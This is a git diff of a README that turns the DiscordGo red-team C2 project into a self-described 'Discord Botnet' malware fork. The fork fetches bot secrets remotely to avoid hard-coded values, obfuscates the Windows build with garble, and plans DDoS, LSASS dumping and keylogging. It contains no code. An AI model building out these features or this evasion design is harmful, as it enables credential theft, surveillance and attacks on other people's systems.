@@ -1,20 +1,10 @@
-<h1 align="center"> DiscordGo </h1> 
-<p align="center">
-  <a>
-    <img src="./img/logo.png" width="400">
-  </a>
-</p>
-
-Discord C2 for Redteam engagement....Need a better name.
-If you can think of one, please tell me. :)
+Discord Botnet :)
 
 Not to be confused with DiscordGo library which I use for the backend.
 
-# Why I made this
+# Why ?
 
-During Blue-Red Team competition, I needed an easy and fast way to keep connected and a way for mutiple redteamer to run commands, hence DiscordGo.
-Since Discord is getting popular, why not use the platorm as a c2.
-That's what this project is about.
+Decided to bounce off of https://github.com/emmaunel/DiscordGo.git and modify it into something similar that fits my specific needs.
 
 # Installation
 
@@ -31,23 +21,11 @@ When creating the bot, you need it give it some permission. For testing, I gave 
 
 # Usage
 
-Edit this file `pkg/util/variables.go` with your `BotToken` and `ServerID`. Or create the file if not there
+Edit this file `pkg/util/variables.go` with a url that gets a json file containing the serverID and botToken remotely. This is done so that the malware does not contain any hard coded secrets.
 
 The bot token can be found on discord developer dashboard where you created the bot. To get your server ID, go to your server setting and click on `widget`. On the right pane, you see the your ID.
 
-An example configuration file looks like this:
-```
-var ServerID = "XXXXXXXXXXX"
-var BotToken = "XXXXXXXXXXX"
-```
-
-After that is done, all you have to do is run `make`. That will create 3 binaries.
-
-```
-- linux-agent
-- windows-agent.exe
-- macos-agent
-```
+After that is done, all you have to do is run `make`. This will create binaries in the /bin folder. The windows binary is built with garble and normally as well for the sake of variety.
 
 ## Organizer Bot
 
@@ -73,38 +51,15 @@ Run `clean` in any channel to organize bots into their respective categories.
 # Feature
 
 * Cross-platform
-* Organozer(talk about and intergration to pwnboard)
+* Organizer(talk about and intergration to pwnboard)
 
 
 # WIP (Work in Progress)
 
-- [x] Cross-platform
-- [x] File upload
-- [x] File download
-- [x] Agent grouping(by hostname like web hosts and so on, slash command)
-- [x] Group commands
-- [X] Add logging to organizer
-- [X] Comp CSV Generation file
-- [ ] Integrate with pwndrop
-
-
-
-# Screenshots
-<p align="center">
-  <a>
-    <img src="./img/example-team.png" width="860">
-  </a>
-</p>
-<p align="center">
-  <a>
-    <img src="./img/example-command.png" width="860">
-  </a>
-</p>
-
-# Co-Authors
-
-* @Fred(https://github.com/frybin)
-Thanks for late night fixes during deploy
+- [x] Use windows syscalls
+- [ ] DDOS capability
+- [ ] Dumping LSASS
+- [ ] Keylogging
 
 # Disclamers
 The author is in no way responsible for any illegal use of this software. It is provided purely as an educational proof of concept. I am also not responsible for any damages or mishaps that may happen in the course of using this software. Use at your own risk.
@@ -113,8 +68,7 @@ Every message on discord are saved on Discord's server, so be careful and not up
 
 # Used Libraries
 * [discordgo](https://github.com/bwmarrin/discordgo)
+* [garble](https://github.com/burrowers/garble.git)
 
 
-Inspired by [SierrOne](https://github.com/berkgoksel/SierraOne)
-
-Logo by @BradHacker(https://github.com/BradHacker)
+Inspired by/mostly ripped from [emmaunel](https://github.com/emmaunel)
